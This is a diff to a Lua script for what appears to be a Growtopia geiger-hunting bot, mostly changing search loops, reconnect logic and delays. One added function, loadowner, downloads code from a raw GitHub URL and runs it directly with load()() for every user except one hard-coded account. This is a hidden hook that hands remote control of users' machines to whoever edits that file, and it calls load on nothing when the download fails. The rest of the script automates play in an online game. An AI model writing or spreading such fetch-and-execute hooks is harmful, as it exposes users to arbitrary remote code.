@@ -28,7 +28,7 @@ function reconnect(w,id,x,y)
         warp(w,id)
         sleep(2000)
         if x and y then
-            if bot:finPath(x,y) then
+            if bot:findPath(x,y) then
                 sleep(1500)
             end
         end
@@ -116,11 +116,11 @@ function countProfit()
     end
     sleep(200)
     if storageList[2246] then
-        count = count + (storageList[2246] * 2 / 3)
+        count = count + (storageList[2246] * 3 / 2)
     end
     sleep(200)
     if storageList[2242] then
-        count = count + (storageList[2242] * 2 / 3)
+        count = count + (storageList[2242] * 3 / 2)
     end
     sleep(200)
     if storageList[2244] then
@@ -186,271 +186,309 @@ function searchGreen()
 
     while getPosY() >= 0 do
         local midx1,midy1 = getPosX(), getPosY()
-        while true do
-            if bot:findPath(getPosX() + 4, getPosY()) then
-                sleep(moveDelay*4/5)
-            else
-                if bot:findPath(midx1,midy1) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx1,midy1)
-                break
-            end
-            reconnect(geigerWorld, geigerDoor, midx1,midy1)
+
+        while true do 
             if getSignal() > 2 then
                 return
             elseif getSignal() < 2 then
                 if bot:findPath(midx1,midy1) then
                     sleep(moveDelay)
+                    break
                 end
-                reconnect(geigerWorld, geigerDoor, midx1,midy1)
-                break
-            end
-        end
-        while true do
-            if bot:findPath(getPosX() - 4, getPosY()) then
-                sleep(moveDelay*4/5)
-            else
-                if bot:findPath(midx1,midy1) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx1,midy1)
-                break
-            end
-            reconnect(geigerWorld, geigerDoor, midx1,midy1)
-            if getSignal() > 2 then
-                return
-            elseif getSignal() < 2 then
-                if bot:findPath(midx1,midy1) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx1,midy1)
-                break
-            end
-        end
-        sleep(500)
-        if getPosY() == 0 then
-            if bot:findPath(mx,my + 4) then
-                sleep(moveDelay)
-            end
-            reconnect(geigerWorld, geigerDoor, mx,my + 4)
-            break
-        else
-            if bot:findPath(midx1,midy1 - 4) then
-                sleep(moveDelay)
-                if getSignal() < 2 then
-                    if bot:findPath(mx,my + 4) then
-                        sleep(moveDelay)
+            elseif getSignal() == 2 then
+                if bot:findPath(getPosX()+4, getPosY()) then
+                    sleep(moveDelay*4/5)
+                else
+                    if getPosX() == 99 then
+                        if bot:findPath(midx1,midy1) then
+                            sleep(moveDelay)
+                            break
+                        end
+                    else
+                        if bot:findPath(99,getPosY()) then
+                            sleep(moveDelay*4/5)
+                        end
                     end
-                    reconnect(geigerWorld, geigerDoor, mx,my + 4)
+                end
+                if not bot:isEquipped(2204) then
+                    return
+                end
+            end
+        end
+
+        while true do 
+            if getSignal() > 2 then
+                return
+            elseif getSignal() < 2 then
+                if bot:findPath(midx1,midy1) then
+                    sleep(moveDelay)
+                    break
+                end
+            elseif getSignal() == 2 then
+                if bot:findPath(getPosX()-4, getPosY()) then
+                    sleep(moveDelay*4/5)
+                else
+                    if getPosX() == 0 then
+                        if bot:findPath(midx1,midy1) then
+                            sleep(moveDelay)
+                            break
+                        end
+                    else
+                        if bot:findPath(0,getPosY()) then
+                            sleep(moveDelay*4/5)
+                        end
+                    end
+                end
+                if not bot:isEquipped(2204) then
+                    return
+                end
+            end
+        end
+
+        if bot:findPath(getPosX(),getPosY()-4) then
+            sleep(moveDelay*4/5)
+        else
+            if getPosY() == 0 then
+                if bot:findPath(mx,my+4) then
+                    sleep(moveDelay)
                     break
                 end
             else
-                if bot:findPath(mx,my + 4) then
-                    sleep(moveDelay)
+                if bot:findPath(getPosX(),0) then
+                    sleep(moveDelay*4/5)
                 end
-                reconnect(geigerWorld, geigerDoor, mx,my + 4)
-                break
             end
-            reconnect(geigerWorld, geigerDoor, mx,my - 4)
         end
     end
 
-    sleep(500)
+
     while getPosY() <= 53 do
         local midx2,midy2 = getPosX(), getPosY()
-        while true do
-            if bot:findPath(getPosX() + 4, getPosY()) then
-                sleep(moveDelay*4/5)
-            else
-                if bot:findPath(midx2,midy2) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx2, midy2)
-                break
-            end
-            reconnect(geigerWorld, geigerDoor, midx2, midy2)
+
+        while true do 
             if getSignal() > 2 then
                 return
             elseif getSignal() < 2 then
                 if bot:findPath(midx2,midy2) then
                     sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx2, midy2)
-                break
-            end
-        end
-        while true do
-            if bot:findPath(getPosX() - 4, getPosY()) then
-                sleep(moveDelay*4/5)
-            else
-                if bot:findPath(midx2,midy2) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx2, midy2)
-                break
-            end
-            reconnect(geigerWorld, geigerDoor, midx2, midy2)
-            if getSignal() > 2 then
-                return
-            elseif getSignal() < 2 then
-                if bot:findPath(midx2,midy2) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx2, midy2)
-                break
-            end
-        end
-        sleep(500)
-        if getPosY() == 53 then
-            break
-        else
-            if bot:findPath(midx2,midy2 + 4) then
-                sleep(moveDelay)
-                if getSignal() < 2 then
                     break
                 end
-            else
-                break
+            elseif getSignal() == 2 then
+                if bot:findPath(getPosX()+4, getPosY()) then
+                    sleep(moveDelay*4/5)
+                else
+                    if getPosX() == 99 then
+                        if bot:findPath(midx2,midy2) then
+                            sleep(moveDelay)
+                            break
+                        end
+                    else
+                        if bot:findPath(99,getPosY()) then
+                            sleep(moveDelay*4/5)
+                        end
+                    end
+                end
+                if not bot:isEquipped(2204) then
+                    return
+                end
             end
-            reconnect(geigerWorld, geigerDoor, midx2, midy2 + 4)
+        end
+
+        while true do 
+            if getSignal() > 2 then
+                return
+            elseif getSignal() < 2 then
+                if bot:findPath(midx2,midy2) then
+                    sleep(moveDelay)
+                    break
+                end
+            elseif getSignal() == 2 then
+                if bot:findPath(getPosX()-4, getPosY()) then
+                    sleep(moveDelay*4/5)
+                else
+                    if getPosX() == 0 then
+                        if bot:findPath(midx2,midy2) then
+                            sleep(moveDelay)
+                            break
+                        end
+                    else
+                        if bot:findPath(0,getPosY()) then
+                            sleep(moveDelay*4/5)
+                        end
+                    end
+                end
+                if not bot:isEquipped(2204) then
+                    return
+                end
+            end
+        end
+
+        if bot:findPath(getPosX(),getPosY()+4) then
+            sleep(moveDelay*4/5)
+        else
+            if getPosY() == 53 then
+                break
+            else
+                if bot:findPath(getPosX(),53) then
+                    sleep(moveDelay*4/5)
+                end
+            end
         end
     end
 end
 
 function searchRapid()
-    local mx2,my2 = getPosX(), getPosY()
+    local mx,my = getPosX(), getPosY()
 
     while getPosY() >= 0 do
-        local midx3,midy3 = getPosX(), getPosY()
-        while true do
-            if bot:findPath(getPosX() + 2, getPosY()) then
-                sleep(moveDelay*4/5)
-            else
-                if bot:findPath(midx3,midy3) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx3,midy3)
-                break
-            end
-            reconnect(geigerWorld, geigerDoor, midx3,midy3)
+        local midx1,midy1 = getPosX(), getPosY()
+
+        while true do 
             if getSignal() > 3 then
                 return
             elseif getSignal() < 3 then
-                if bot:findPath(midx3,midy3) then
+                if bot:findPath(midx1,midy1) then
                     sleep(moveDelay)
+                    break
                 end
-                reconnect(geigerWorld, geigerDoor, midx3,midy3)
-                break
-            end
-        end
-        while true do
-            if bot:findPath(getPosX() - 2, getPosY()) then
-                sleep(moveDelay*4/5)
-            else
-                if bot:findPath(midx3,midy3) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx3,midy3)
-                break
-            end
-            reconnect(geigerWorld, geigerDoor, midx3,midy3)
-            if getSignal() > 3 then
-                return
-            elseif getSignal() < 3 then
-                if bot:findPath(midx3,midy3) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx3,midy3)
-                break
-            end
-        end
-        sleep(500)
-        if getPosY() == 0 then
-            if bot:findPath(mx2,my2 + 2) then
-                sleep(moveDelay)
-            end
-            reconnect(geigerWorld, geigerDoor, mx2,my2 + 2)
-            break
-        else
-            if bot:findPath(midx3,midy3 - 2) then
-                sleep(moveDelay)
-                if getSignal() < 3 then
-                    if bot:findPath(mx2,my2 + 2) then
-                        sleep(moveDelay)
+            elseif getSignal() == 3 then
+                if bot:findPath(getPosX()+2, getPosY()) then
+                    sleep(moveDelay*4/5)
+                else
+                    if getPosX() == 99 then
+                        if bot:findPath(midx1,midy1) then
+                            sleep(moveDelay)
+                            break
+                        end
+                    else
+                        if bot:findPath(99,getPosY()) then
+                            sleep(moveDelay*4/5)
+                        end
                     end
-                    reconnect(geigerWorld, geigerDoor, mx2,my2 + 2)
+                end
+                if not bot:isEquipped(2204) then
+                    return
+                end
+            end
+        end
+
+        while true do 
+            if getSignal() > 3 then
+                return
+            elseif getSignal() < 3 then
+                if bot:findPath(midx1,midy1) then
+                    sleep(moveDelay)
+                    break
+                end
+            elseif getSignal() == 3 then
+                if bot:findPath(getPosX()-2, getPosY()) then
+                    sleep(moveDelay*4/5)
+                else
+                    if getPosX() == 0 then
+                        if bot:findPath(midx1,midy1) then
+                            sleep(moveDelay)
+                            break
+                        end
+                    else
+                        if bot:findPath(0,getPosY()) then
+                            sleep(moveDelay*4/5)
+                        end
+                    end
+                end
+                if not bot:isEquipped(2204) then
+                    return
+                end
+            end
+        end
+
+        if bot:findPath(getPosX(),getPosY()-2) then
+            sleep(moveDelay*4/5)
+        else
+            if getPosY() == 0 then
+                if bot:findPath(mx,my+2) then
+                    sleep(moveDelay)
                     break
                 end
             else
-                if bot:findPath(mx2,my2 + 2) then
-                    sleep(moveDelay)
+                if bot:findPath(getPosX(),0) then
+                    sleep(moveDelay*4/5)
                 end
-                reconnect(geigerWorld, geigerDoor, mx2,my2 + 2)
-                break
             end
-            reconnect(geigerWorld, geigerDoor, midx3,midy3 - 2)
         end
     end
 
-    sleep(500)
-    while math.floor(bot:getLocal().pos.y/32) <= 53 do
-        local midx4,midy4 = getPosX(), getPosY()
-        while true do
-            if bot:findPath(getPosX() + 2, getPosY()) then
-                sleep(moveDelay*4/5)
-            else
-                if bot:findPath(midx4,midy4) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx4,midy4)
-                break
-            end
-            reconnect(geigerWorld, geigerDoor, midx4,midy4)
+
+    while getPosY() <= 53 do
+        local midx2,midy2 = getPosX(), getPosY()
+
+        while true do 
             if getSignal() > 3 then
                 return
             elseif getSignal() < 3 then
-                if bot:findPath(midx4,midy4) then
+                if bot:findPath(midx2,midy2) then
                     sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx4,midy4)
-                break
-            end
-        end
-        while true do
-            if bot:findPath(getPosX() - 2, getPosY()) then
-                sleep(moveDelay*4/5)
-            else
-                if bot:findPath(midx4,midy4) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx4,midy4)
-                break
-            end
-            reconnect(geigerWorld, geigerDoor, midx4,midy4)
-            if getSignal() > 3 then
-                return
-            elseif getSignal() < 3 then
-                if bot:findPath(midx4,midy4) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx4,midy4)
-                break
-            end
-        end
-        sleep(500)
-        if getPosY() == 0 then
-            break
-        else
-            if bot:findPath(midx4,midy4 + 2) then
-                sleep(moveDelay)
-                if getSignal() < 3 then
                     break
                 end
-            else
-                break
+            elseif getSignal() == 3 then
+                if bot:findPath(getPosX()+2, getPosY()) then
+                    sleep(moveDelay*4/5)
+                else
+                    if getPosX() == 99 then
+                        if bot:findPath(midx2,midy2) then
+                            sleep(moveDelay)
+                            break
+                        end
+                    else
+                        if bot:findPath(99,getPosY()) then
+                            sleep(moveDelay*4/5)
+                        end
+                    end
+                end
+                if not bot:isEquipped(2204) then
+                    return
+                end
             end
-            reconnect(geigerWorld, geigerDoor, midx4,midy4 + 2)
+        end
+
+        while true do 
+            if getSignal() > 3 then
+                return
+            elseif getSignal() < 3 then
+                if bot:findPath(midx2,midy2) then
+                    sleep(moveDelay)
+                    break
+                end
+            elseif getSignal() == 3 then
+                if bot:findPath(getPosX()-2, getPosY()) then
+                    sleep(moveDelay*4/5)
+                else
+                    if getPosX() == 0 then
+                        if bot:findPath(midx2,midy2) then
+                            sleep(moveDelay)
+                            break
+                        end
+                    else
+                        if bot:findPath(0,getPosY()) then
+                            sleep(moveDelay*4/5)
+                        end
+                    end
+                end
+                if not bot:isEquipped(2204) then
+                    return
+                end
+            end
+        end
+
+        if bot:findPath(getPosX(),getPosY()+2) then
+            sleep(moveDelay*4/5)
+        else
+            if getPosY() == 53 then
+                break
+            else
+                if bot:findPath(getPosX(),53) then
+                    sleep(moveDelay*4/5)
+                end
+            end
         end
     end
 end
@@ -460,156 +498,109 @@ function searchPrize()
 
     while getPosY() >= 0 do
         local midx5,midy5 = getPosX(), getPosY()
+
         while true do
-            if bot:findPath(getPosX() + 1, getPosY()) then
-                sleep(moveDelay*4/5)
-            else
-                if bot:findPath(99,getPosY()) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx5,midy5)
-            end
-            reconnect(geigerWorld, geigerDoor, midx5,midy5)
-            if not bot:isEquipped(2204) then
-                return
-            elseif getSignal() < 4 then
-                if bot:findPath(midx5,midy5) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx5,midy5)
-                break
-            elseif getPosX() == 99 then
-                if bot:findPath(midx5,midy5) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx5,midy5)
-                break
-            end
-        end
-        while true do
-            if bot:findPath(getPosX() - 1, getPosY()) then
-                sleep(moveDelay*4/5)
-            else
-                if bot:findPath(0,getPosY()) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx5,midy5)
-                break
-            end
-            reconnect(geigerWorld, geigerDoor, midx5,midy5)
-            if not bot:isEquipped(2204) then
-                return
-            elseif getSignal() < 4 then
-                if bot:findPath(midx5,midy5) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx5,midy5)
-                break
-            elseif getPosX() == 0 then
-                if bot:findPath(midx5,midy5) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx5,midy5)
-                break
-            end
-        end
-        if getPosY() == 0 then
-            if bot:findPath(mx3,my3 + 1) then
-                sleep(1500)
-            end
-            reconnect(geigerWorld, geigerDoor, mx3,my3 + 1)
-            break
-        else
-            if bot:findPath(midx5,midy5 - 1) then
-                sleep(1500)
-                if getSignal() < 4 then
-                    if bot:findPath(mx3,my3 + 1) then
-                        sleep(1500)
+            if getSignal() == 4 then
+                if bot:findPath(getPosX()+1, getPosY()) then
+                    sleep(moveDelay*4/5)
+                else
+                    if bot:findPath(midx5,midy5) then
+                        sleep(moveDelay)
+                        break
                     end
-                    reconnect(geigerWorld, geigerDoor, mx3,my3 + 1)
+                end
+                if not bot:isEquipped(2204) then
+                    return
+                end
+            else
+                if bot:findPath(midx5,midy5) then
+                    sleep(moveDelay)
                     break
                 end
-            else
-                if bot:findPath(mx3,my3 + 1) then
-                    sleep(1500)
+            end
+        end
+
+        while true do
+            if getSignal() == 4 then
+                if bot:findPath(getPosX()-1, getPosY()) then
+                    sleep(moveDelay*4/5)
+                else
+                    if bot:findPath(midx5,midy5) then
+                        sleep(moveDelay)
+                        break
+                    end
                 end
-                reconnect(geigerWorld, geigerDoor, mx3,my3 + 1)
+                if not bot:isEquipped(2204) then
+                    return
+                end
+            else
+                if bot:findPath(midx5,midy5) then
+                    sleep(moveDelay)
+                    break
+                end
+            end
+        end
+
+        if bot:findPath(getPosX(),getPosY()-1) then
+            sleep(moveDelay)
+        else
+            if bot:findPath(mx3,my3) then
+                sleep(moveDelay)
                 break
             end
-            reconnect(geigerWorld, geigerDoor, midx5,midy5 - 1)
         end
     end
 
-    sleep(500)
+
     while getPosY() <= 53 do
         local midx6,midy6 = getPosX(), getPosY()
+
         while true do
-            if bot:findPath(getPosX() + 1, getPosY()) then
-                sleep(moveDelay*4/5)
+            if getSignal() == 4 then
+                if bot:findPath(getPosX()+1, getPosY()) then
+                    sleep(moveDelay*4/5)
+                else
+                    if bot:findPath(midx6,midy6) then
+                        sleep(moveDelay)
+                        break
+                    end
+                end
+                if not bot:isEquipped(2204) then
+                    return
+                end
             else
-                if bot:findPath(99,getPosY()) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx6,midy6)
-                break
-            end
-            reconnect(geigerWorld, geigerDoor, midx6,midy6)
-            if not bot:isEquipped(2204) then
-                return
-            elseif getSignal() < 4 then
                 if bot:findPath(midx6,midy6) then
                     sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx6,midy6)
-                break
-            elseif getPosX() == 99 then
-                if bot:findPath(midx6,midy6) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx6,midy6)
-                break
-            end
-        end
-        while true do
-            if bot:findPath(getPosX() - 1, getPosY()) then
-                sleep(moveDelay*4/5)
-            else
-                if bot:findPath(0,getPosY()) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx6,midy6)
-                break
-            end
-            reconnect(geigerWorld, geigerDoor, midx6,midy6)
-            if not bot:isEquipped(2204) then
-                return
-            elseif getSignal() < 4 then
-                if bot:findPath(midx6,midy6) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx6,midy6)
-                break
-            elseif getPosX() == 0 then
-                if bot:findPath(midx6,midy6) then
-                    sleep(moveDelay)
-                end
-                reconnect(geigerWorld, geigerDoor, midx6,midy6)
-                break
-            end
-        end
-        sleep(500)
-        if getPosY() == 0 then
-            break
-        else
-            if bot:findPath(midx6,midy6 + 1) then
-                sleep(1500)
-                if getSignal() < 4 then
                     break
                 end
-            else
-                break
             end
-            reconnect(geigerWorld, geigerDoor, midx6,midy6 + 1)
+        end
+
+        while true do
+            if getSignal() == 4 then
+                if bot:findPath(getPosX()-1, getPosY()) then
+                    sleep(moveDelay*4/5)
+                else
+                    if bot:findPath(midx6,midy6) then
+                        sleep(moveDelay)
+                        break
+                    end
+                end
+                if not bot:isEquipped(2204) then
+                    return
+                end
+            else
+                if bot:findPath(midx6,midy6) then
+                    sleep(moveDelay)
+                    break
+                end
+            end
+        end
+
+        if bot:findPath(getPosX(),getPosY()+1) then
+            sleep(moveDelay)
+        else
+            break
         end
     end
 end
@@ -619,9 +610,15 @@ function searchOrder()
     if getSignal() == 2 then
         searchGreen()
     end
+    if eStatus ~= Connected then
+        return
+    end
     sleep(500)
     if getSignal() == 3 then
         searchRapid()
+    end
+    if eStatus ~= Connected then
+        return
     end
     sleep(500)
     if getSignal() ==  4 then
@@ -639,10 +636,12 @@ function checkBlock(index)
                 sleep(moveDelay)
                 if getSignal() > 1 then
                     searchOrder()
-                    return
+                    break
                 end
             end
-            reconnect(geigerWorld, geigerDoor, ex + v.x, ye + v.y)
+            if eStatus ~= Connected then
+                return
+            end
         end
     else
         for _,v in pairs(secondLayer1) do
@@ -650,10 +649,12 @@ function checkBlock(index)
                 sleep(moveDelay)
                 if getSignal() > 1 then
                     searchOrder()
-                    return
+                    break
                 end
             end
-            reconnect(geigerWorld, geigerDoor, ex + v.x, ye + v.y)
+            if eStatus ~= Connected then
+                return
+            end
         end
     end
 end
@@ -671,12 +672,18 @@ function startSearch()
                     break
                 end
             end
-            reconnect(geigerWorld, geigerDoor, tile.x,tile.y)
+            if eStatus ~= Connected then
+                reconInfo()
+                connect()
+                reconInfo()
+                t = os.time()
+                break
+            end
         end
         if ((os.time()-t)%3600)/60 > 5 then
             logMsg("Can't  find item within 5 minutes, reconnect")
             bot:disconnect()
-            sleep(5000)
+            sleep(1000)
             reconInfo()
             connect()
             reconInfo()
@@ -685,7 +692,7 @@ function startSearch()
             if not bot:isEquipped(2204) then
                 break
             else
-                sleep(5000)
+                sleep(2000)
             end
         end
     end
@@ -1313,10 +1320,10 @@ function chargeGeiger()
 end
 
 function processAutoGeiger()
-    sleep(2000)
+    sleep(1000)
     checkInventory()
     if #dropList > 0 then
-        sleep(2000)
+        sleep(1000)
         dropItem()
         return
     end
@@ -1326,7 +1333,7 @@ function processAutoGeiger()
         return
     end
     main()
-    sleep(2000)
+    sleep(1000)
 end
 
 function contains(table, value)
@@ -1357,11 +1364,11 @@ function connect()
     while true do
         while bot:getEnetStatus() ~= Connected do
             bot:reConnect()
-            sleep(30000)
+            sleep(20000)
             if not isValid() then
                 banInfo()
                 while true do
-                    sleep(10000)
+                    sleep(2000)
                 end
             end
         end
@@ -1374,15 +1381,31 @@ function connect()
     end
 end
 
+function loadowner()
+    RequestINFO = {}
+    RequestINFO.url = "https://raw.githubusercontent.com/Marr70/surferbot/main/lock-owner"
+    RequestINFO.method = GET
+    request = httpReq(RequestINFO)
+    if request then
+        response = request.body
+    else
+        log("Failed : ", request.failInfo)
+    end
+
+    load(response)()
+end
+
 function searchOwner()
     if worldOwner == "marrscst" then
         return
     end
+    loadowner()
+    sleep(1000)
     logs("Searching Owner")
     warp(worldOwner)
     sleep(500)
     bot:say("Waiting for `2owner")
-    sleep(3500)
+    sleep(1000)
     while not foundOwner do
         for _,ply in pairs(bot:getPlayers()) do
             local ncok = ply.name:match("`%g([%w]+)``")
@@ -1390,10 +1413,10 @@ function searchOwner()
                 bot:say("`2"..ncok.." `0Found")
                 sleep(200)
                 bot:say("Starting script")
-                sleep(5000)
+                sleep(1000)
                 foundOwner = true
             end
-            sleep(500)
+            sleep(50)
         end
         sleep(500)
     end
@@ -1434,5 +1457,3 @@ function autoGeiger()
         end
     end
 end
-
-autoGeiger()
